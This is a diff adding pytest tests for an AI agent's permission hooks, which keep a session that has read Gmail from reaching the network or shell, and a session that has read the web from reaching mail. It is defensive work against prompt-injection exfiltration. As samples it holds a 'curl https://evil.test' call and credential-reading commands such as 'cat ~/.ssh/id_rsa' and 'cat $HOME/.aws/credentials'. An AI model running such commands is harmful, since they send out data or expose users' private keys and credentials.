@@ -330,6 +330,78 @@ async def test_only_the_work_thread_reaches_google(
     assert "strict-mcp-config" in options.extra_args
 
 
+def _denied(decision: dict[str, Any]) -> bool:
+    return bool(decision) and decision["hookSpecificOutput"]["permissionDecision"] == "deny"
+
+
+GOOGLE_CALL = {"tool_name": executor.ALLOWED_TOOL, "tool_input": {"action": "gmail_read"}}
+
+
+@pytest.mark.parametrize("tool", ["Bash", "WebFetch", "WebSearch", "Agent", "Task"])
+async def test_what_read_the_mail_cannot_send_it_out(sdk, jarvis: Path, tool: str) -> None:
+    sdk.tool_calls = [
+        GOOGLE_CALL,
+        {"tool_name": tool, "tool_input": {"command": "curl https://evil.test"}},
+        {"tool_name": "Read", "tool_input": {"file_path": "ok.md"}},
+        GOOGLE_CALL,
+    ]
+    sdk.messages = [_result("Hecho")]
+    result = await run_executor("ak", "m", "t", ExecutorConfig(str(jarvis)))
+
+    assert [_denied(d) for d in sdk.last.decisions] == [False, True, False, False]
+    # Nothing to carry on: its context holds what outsiders wrote.
+    assert result.session_id == ""
+
+
+@pytest.mark.parametrize("tool", ["Bash", "WebFetch", "WebSearch", "Agent", "Task"])
+async def test_what_read_the_web_cannot_reach_the_mail(sdk, jarvis: Path, tool: str) -> None:
+    sdk.tool_calls = [{"tool_name": tool, "tool_input": {"command": "ls"}}, GOOGLE_CALL]
+    sdk.messages = [_result("Hecho")]
+    await run_executor("ak", "m", "t", ExecutorConfig(str(jarvis)))
+    assert [_denied(d) for d in sdk.last.decisions] == [False, True]
+
+
+async def test_a_refused_command_does_not_close_google(sdk, jarvis: Path) -> None:
+    sdk.tool_calls = [{"tool_name": "Bash", "tool_input": {"command": "git push"}}, GOOGLE_CALL]
+    await run_executor("ak", "m", "t", ExecutorConfig(str(jarvis)))
+    assert [_denied(d) for d in sdk.last.decisions] == [True, False]
+
+
+async def test_a_run_that_carries_on_may_hold_anything(sdk, jarvis: Path) -> None:
+    sdk.tool_calls = [GOOGLE_CALL, {"tool_name": "Bash", "tool_input": {"command": "ls"}}]
+    await run_executor("ak", "m", "t", ExecutorConfig(str(jarvis)), resume="s1")
+    assert [_denied(d) for d in sdk.last.decisions] == [True, False]
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "cat ~/.ssh/id_rsa",
+        "cat ~",
+        "cat $HOME/.aws/credentials",
+        'cat "${HOME}/secret"',
+        "cat $USERPROFILE/x",
+        "type %USERPROFILE%\\x",
+    ],
+)
+def test_the_home_by_another_name_is_outside(tmp_path: Path, monkeypatch, command: str) -> None:
+    monkeypatch.setattr(Path, "home", lambda: tmp_path / "home")
+    root = tmp_path / "home" / "jarvis"
+    root.mkdir(parents=True)
+    assert "outside" in (check_tool_call(root, "Bash", {"command": command}) or "")
+
+
+@pytest.mark.parametrize(
+    "command",
+    ["cat ~/jarvis/notes.md", "git diff HEAD~1", "echo $HOMEBREW_PREFIX", "ls backup~"],
+)
+def test_the_home_check_lets_the_rest_through(tmp_path: Path, monkeypatch, command: str) -> None:
+    monkeypatch.setattr(Path, "home", lambda: tmp_path / "home")
+    root = tmp_path / "home" / "jarvis"
+    root.mkdir(parents=True)
+    assert check_tool_call(root, "Bash", {"command": command}) is None
+
+
 @pytest.mark.skipif(sys.platform != "win32", reason="a drive path is inside only on Windows")
 def test_a_windows_host_lets_a_command_name_files_inside_the_folder(tmp_path: Path) -> None:
     """Absolute paths inside the folder do not stop the scan of a command.
